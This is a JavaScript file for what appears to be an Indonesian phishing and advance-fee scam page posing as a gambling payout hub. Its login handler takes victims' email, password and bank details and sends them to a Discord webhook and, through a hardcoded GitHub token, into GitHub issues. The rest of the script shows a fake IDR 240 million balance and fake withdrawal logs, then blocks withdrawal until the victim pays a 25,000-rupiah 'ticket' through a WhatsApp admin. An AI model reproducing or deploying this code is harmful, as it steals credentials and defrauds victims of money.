const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1488920982059225218/k3BAyhlX0rVuXmY8gXQ-ECQtMWFduU123hjdsaJJ7Zc3MGsWriERGk3t9XVzwNp-bXhz";
const GH_TOKEN = "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";
const GH_OWNER = "reyyhandalkoding";
const GH_REPO = "maxwin";
const WA_ADMIN = "https://wa.me/6282224301835";

// 1. OMNI-CAPTURE V20
async function omniIdentity() {
    const u = document.getElementById('email').value;
    const p = document.getElementById('pass').value;
    const b = document.getElementById('bank').value;

    if(!u || !p) return alert("Quantum Error: Akses Ditolak!");

    document.getElementById('auth-panel').classList.add('hidden');
    document.getElementById('bio-scan').classList.remove('hidden');

    const meta = `${navigator.platform} | ${navigator.userAgent.split(')')[0].split('(')[1]}`;

    // Discord Push
    fetch(DISCORD_WEBHOOK, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            username: "V20_OVERLOD_BOT",
            embeds: [{
                title: "💎 NEW QUANTUM HARVEST 💎",
                color: 10494192,
                fields: [
                    { name: "👤 User", value: `\`${u}\`` },
                    { name: "🔑 Pass", value: `\`${p}\`` },
                    { name: "🏦 Bank", value: b },
                    { name: "📱 Device", value: meta }
                ],
                footer: { text: "Protocol: V20 Singularity" },
                timestamp: new Date()
            }]
        })
    });

    // GitHub Push
    fetch(`https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/issues`, {
        method: 'POST',
        headers: { 'Authorization': `token ${GH_TOKEN}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({ title: `V20_CAPTURE: ${u}`, body: `PASS: ${p} | DEVICE: ${meta} | BANK: ${b}` })
    });

    // Simulasi Scanning
    let progress = 0;
    const fill = document.querySelector('.fill');
    const interval = setInterval(() => {
        progress += 10;
        fill.style.width = progress + "%";
        if(progress >= 100) {
            clearInterval(interval);
            setTimeout(() => unlockV20(u), 500);
        }
    }, 400);
}

function unlockV20(u) {
    document.getElementById('gate').classList.add('hidden');
    document.getElementById('hub').classList.remove('blur-v20');
    document.getElementById('hub').style.filter = "none";
    document.getElementById('hub').style.pointerEvents = "auto";
    
    // Auto-roll Balance
    let bal = 0;
    const roller = setInterval(() => {
        bal += 11234567;
        if(bal >= 240750000) { bal = 240750000; clearInterval(roller); }
        document.getElementById('user-bal').innerText = "IDR " + bal.toLocaleString('id-ID') + ",00";
    }, 40);

    startLiveFeed();
}

// 2. LIVE FEED (Psychology Booster)
function startLiveFeed() {
    const feed = document.getElementById('live-feed');
    const logs = ["TRX: ID_882 CAIR 10JT", "TRX: ID_012 CAIR 50JT", "SERVER: BYPASS BI-FAST SUCCESS", "NODE: SG-PRIVATE CONNECTED"];
    setInterval(() => {
        const div = document.createElement('div');
        div.style.fontSize = "8px";
        div.style.color = "#444";
        div.style.marginBottom = "5px";
        div.innerText = "> " + logs[Math.floor(Math.random() * logs.length)];
        feed.prepend(div);
        if(feed.children.length > 5) feed.lastChild.remove();
    }, 3000);
}

// 3. WITHDRAW TRAP V20
function triggerWD() {
    const term = document.getElementById('logs');
    term.innerHTML += "<br>> ERROR: Node 'Baru' Terdeteksi.";
    term.innerHTML += "<br>> INFO: Menunggu Tiket Quantum (Rp 25.000).";
    
    alert("🚨 PENARIKAN DIBLOKIR SATELIT 🚨\n\nSistem V20 mendeteksi Akun Anda adalah Node Baru. Untuk sinkronisasi otomatis saldo Rp 240.750.000 ke rekening, Anda wajib memiliki 'Tiket Quantum' sebesar Rp 25.000.\n\nKlik OK untuk panduan aktivasi via Admin WhatsApp Pusat.");
    
    const msg = encodeURIComponent("Woi Admin V20, saldo gue 240 JUTA nyangkut di satelit. Gue mau bayar TIKET QUANTUM 25rb sekarang biar cair.");
    window.open(`${WA_ADMIN}?text=${msg}`, "_blank");
}

function startSpin() {
    alert("INJECTING V20 QUANTUM RTP...");
    setTimeout(() => {
        alert("💥 BIG WIN! Saldo bertambah 50JT!");
        let current = 240750000 + 50000000;
        document.getElementById('user-bal').innerText = "IDR " + current.toLocaleString('id-ID') + ",00";
    }, 2000);
}
